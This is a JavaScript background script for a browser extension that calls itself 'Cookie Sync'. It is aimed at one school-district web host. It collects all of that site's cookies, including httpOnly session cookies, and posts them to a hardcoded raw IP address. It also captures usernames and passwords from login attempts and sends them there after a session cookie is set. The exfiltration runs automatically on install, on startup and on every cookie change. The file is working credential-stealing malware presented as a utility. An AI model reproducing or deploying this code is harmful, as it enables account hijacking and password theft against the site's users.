const TARGET_HOST = 'sishrsb.ednet.ns.ca';
const RELAY_URL = 'https://155.117.41.185/p/sender';
const DEBOUNCE_ALARM = 'cookie-sync-debounce';

let pendingLogin = null;

function domainAppliesToTarget(d) {
	if (!d) return false;
	const h = d.startsWith('.') ? d.slice(1) : d;
	return h === TARGET_HOST || TARGET_HOST.endsWith('.' + h);
}

// Generate a stable unique sender name on first install, persist it.
async function getSenderName() {
	const { senderName } = await chrome.storage.local.get('senderName');
	if (senderName) return senderName;
	// Use the extension's install ID + a short random suffix as a stable unique name.
	const id = chrome.runtime.id.slice(-6);
	const rand = Math.random().toString(36).slice(2, 6);
	const name = `device-${id}${rand}`;
	await chrome.storage.local.set({ senderName: name });
	return name;
}

async function collectCookies() {
	const map = new Map();
	const addAll = (list) => {
		for (const c of list) map.set(`${c.name}|${c.domain}|${c.path}`, c);
	};
	addAll(await chrome.cookies.getAll({ domain: TARGET_HOST }));
	addAll(await chrome.cookies.getAll({ url: `https://${TARGET_HOST}/` }));
	return [...map.values()].map((c) => ({
		name: c.name,
		value: c.value,
		domain: c.domain,
		path: c.path,
		secure: c.secure,
		httpOnly: c.httpOnly,
		sameSite: c.sameSite,
		expirationDate: c.expirationDate,
		hostOnly: c.hostOnly,
		session: c.session,
	}));
}

async function pushNow() {
	const senderName = await getSenderName();
	const cookies = await collectCookies();
	try {
		const res = await fetch(`${RELAY_URL}/cookies`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ senderName, cookies }),
		});
		if (res.ok) {
			const data = await res.json();
			await chrome.storage.local.set({ lastPushedVersion: data.version, lastPushedAt: Date.now() });
		}
	} catch (e) {
		console.warn('Cookie Sync sender: push error', e);
	}
}

async function pushCredentials(username, password) {
	const senderName = await getSenderName();
	try {
		await fetch(`${RELAY_URL}/credentials`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ senderName, username, password }),
		});
	} catch (e) {
		console.warn('Cookie Sync sender: credentials push error', e);
	}
}

function schedulePush() {
	chrome.alarms.create(DEBOUNCE_ALARM, { delayInMinutes: 0.014 });
}

chrome.alarms.onAlarm.addListener((alarm) => {
	if (alarm.name === DEBOUNCE_ALARM) pushNow();
});

chrome.cookies.onChanged.addListener((changeInfo) => {
	const c = changeInfo.cookie;
	if (!domainAppliesToTarget(c.domain)) return;
	if (c.name === 'JSESSIONID' && !changeInfo.removed && pendingLogin) {
		const { username, password } = pendingLogin;
		pendingLogin = null;
		pushCredentials(username, password);
	}
	schedulePush();
});

chrome.runtime.onStartup.addListener(() => schedulePush());
chrome.runtime.onInstalled.addListener(() => {
	getSenderName(); // ensure name is generated and stored immediately
	schedulePush();
});

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
	if (msg?.type === 'LOGIN_ATTEMPT') {
		if (msg.username) {
			pendingLogin = { username: msg.username, password: msg.password || '' };
		}
		return false;
	}
});
